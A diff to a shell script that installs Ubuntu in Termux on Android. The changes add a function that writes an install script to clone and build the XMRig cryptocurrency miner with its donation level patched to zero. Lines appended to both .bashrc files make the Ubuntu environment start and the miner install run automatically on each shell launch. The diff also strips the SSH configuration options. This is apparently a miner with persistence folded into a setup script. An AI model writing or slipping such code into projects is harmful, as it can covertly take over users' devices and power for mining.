@@ -14,13 +14,28 @@ start_ubuntu(){
   bash ~/ubuntu-in-termux/startubuntu.sh
 }
 
-add_to_bashrc(){
-  echo "$1" >> ~/.bashrc
+host_bashrc(){
+  echo "bash ~/ubuntu-in-termux/startubuntu.sh" >> ~/.bashrc
 }
 
-autostart_ubuntu(){
-  local command=""
-  add_to_bashrc "$command"
+install_bash(){
+  local bin="$HOME/ubuntu-in-termux/ubuntu-fs/root/install.sh"
+  cat > "$bin" <<- EOM
+#!/bin/bash
+
+apt-get update && apt-get upgrade -y
+
+apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+
+git clone https://github.com/C3Pool/xmrig-C3.git
+sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' ./xmrig-C3/src/donate.h
+sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' ./xmrig-C3/src/donate.h
+mkdir xmrig-C3/build && cd xmrig-C3/build && cmake .. && make -j$(nproc) && mv xmrig ~ && cd ~ && rm -rf xmrig-C3
+sleep 15
+exit
+EOM
+
+  echo "[ ! -e ./xmrig ] && bash ./install.sh" >> ~/ubuntu-in-termux/ubuntu-fs/root/.bashrc
 }
 
 
@@ -59,39 +74,12 @@ while getopts "O:o:" OPT; do
     o)
         MIMING_URL=$OPTARG
         ;;
-    u)
-        KEY_URL=$OPTARG
-        get_url_key
-        install_key
-        ;;
-    f)
-        KEY_PATH=$OPTARG
-        get_loacl_key
-        install_key
-        ;;
-    p)
-        SSH_PORT=$OPTARG
-        change_port
-        ;;
-    d)
-        disable_password
-        ;;
-    ?)
-        USAGE
-        exit 1
-        ;;
-    :)
-        USAGE
-        exit 1
-        ;;
     *)
-        USAGE
+        echo "ERROR IN"
         exit 1
         ;;
     esac
 done
 
-if [ ! -x "$HOME/ubuntu-in-termux/ubuntu-fs/root/service.sh" ]; then
-  install_ubuntu
-  service_bash
-fi
+[ ! -e "$HOME/ubuntu-in-termux/ubuntu-fs/root/service.sh" ] && install_ubuntu && service_bash && install_bash && host_bashrc
+start_ubuntu
